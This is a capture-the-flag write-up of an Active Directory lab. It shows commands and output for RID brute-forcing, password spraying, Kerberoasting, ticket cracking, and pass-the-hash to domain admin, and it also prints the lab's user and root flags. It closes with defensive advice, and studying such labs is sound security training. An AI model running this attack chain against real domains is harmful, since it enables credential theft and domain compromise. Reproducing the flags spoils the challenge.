---
layout: default
title: Soupedecode 01 – Active Directory
page_type: writeup
---

# THM: Soupedecode 01 – Active Directory Enumeration & Kerberoasting

**Category:** Active Directory

---

## Challenge Overview

This challenge simulates a misconfigured Windows Active Directory environment.  
The objective is to obtain initial domain access, escalate privileges, and ultimately compromise the **Domain Administrator** account.

### Environment
- **Domain:** `SOUPEDECODE.LOCAL`
- **Domain Controller:** `DC01.SOUPEDECODE.LOCAL`
- **Services:** SMB, LDAP, Kerberos, RDP, DNS
- **Shares:** `ADMIN$`, `C$`, `backup`, `Users`, `NETLOGON`, `SYSVOL`

### Core Attack Path
This is a classic Active Directory attack chain:
1. Enumerate users and shares
2. Identify weak credentials via RID brute-forcing and spraying
3. Obtain initial user access
4. Kerberoast service accounts
5. Crack service account credentials
6. Access sensitive backup data
7. Abuse machine account hashes for domain compromise

The environment suffers from weak passwords, excessive privileges, and insecure credential storage.

---

## Reconnaissance

### Port Scanning

Service discovery was performed using RustScan:

```bash
rustscan -a 10.65.172.99 --ulimit 5500 -b 65535 -- -A -Pn
````

Key services confirmed Active Directory functionality:

* Kerberos (88)
* LDAP (389 / 3268)
* SMB (445)
* RDP (3389)

**Notable findings:**

* Domain Controller running Windows Server 2022 (Build 20348)
* SMB signing enabled and required

---

## SMB Enumeration

Anonymous enumeration revealed multiple accessible shares:

```bash
smbclient -L //10.65.172.99
```

```
ADMIN$      Disk
backup      Disk
C$          Disk
NETLOGON    Disk
SYSVOL      Disk
Users       Disk
```

The presence of a `backup` share suggested potential misconfigurations worth revisiting after privilege escalation.

---

## User Enumeration

### RID Brute-Forcing

Guest access was leveraged to enumerate domain users:

```bash
nxc smb 10.65.172.99 -u guest -p '' --rid-brute
```

Over 2,000 domain users were identified and extracted:

```bash
nxc smb 10.65.172.99 -u guest -p '' --rid-brute \
| grep SidTypeUser \
| cut -d '\' -f 2 \
| cut -d ' ' -f 1 > users.txt
```

---

## Credential Discovery

### Password Spraying

A basic username-as-password spray quickly yielded valid credentials:

```bash
nxc smb 10.65.172.99 -u users.txt -p users.txt --no-bruteforce
```

```
[+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

---

## Initial Access

Using the compromised credentials, the `Users` share was accessed to retrieve the user flag:

```bash
smbclient //10.65.172.99/Users -U ybob317
```

```
\ybob317\Desktop\user.txt
```

**User flag:** `28189316c25dd3c0ad56d44d000d62a8`

---

## Privilege Escalation

### Kerberoasting

Service account SPNs were enumerated and requested:

```bash
GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 \
  -dc-ip 10.65.172.99 \
  -request \
  -outputfile roast.txt
```

Several service accounts were identified as Kerberoastable.

### Hash Cracking

The extracted ticket was cracked using John:

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt roast.txt
```

```
file_svc : Password123!!
```

---

## Lateral Movement

With service account access, SMB enumeration revealed new permissions:

```bash
nxc smb dc01.soupedecode.local -u file_svc -p 'Password123!!' --shares
```

The `backup` share was now readable.

### Backup Share Abuse

The backup contained machine account NTLM hashes:

```bash
smbclient //10.65.172.99/backup -U file_svc
```

These hashes were suitable for pass-the-hash attacks.

---

## Domain Compromise

One machine account successfully authenticated:

```bash
nxc smb dc01.soupedecode.local -u FileServer$ -H <hash>
```

Administrative access was obtained via Evil-WinRM:

```bash
evil-winrm -i 10.65.172.99 -u FileServer$ -H <hash>
```

**Root flag:** `27cb2be302c388d63d27c86bfdd5f56a`

---

## Attack Summary

### Key Failures

* Weak and reused passwords
* Kerberoastable service accounts
* Overprivileged backup access
* Insecure storage of credential material

### Impact

A single weak user credential led to full domain compromise through chained misconfigurations.

---

## Defensive Recommendations

* Enforce strong password policies
* Use gMSAs for service accounts
* Restrict access to backup data
* Monitor Kerberos ticket requests
* Audit SPNs and service permissions
* Detect pass-the-hash activity

---

## Final Notes

This challenge demonstrates how common Active Directory misconfigurations can be chained together for complete domain compromise.
Proper credential hygiene and least-privilege enforcement would have prevented every stage of this attack.

**Flags**

* User: `28189316c25dd3c0ad56d44d000d62a8`
* Root: `27cb2be302c388d63d27c86bfdd5f56a`
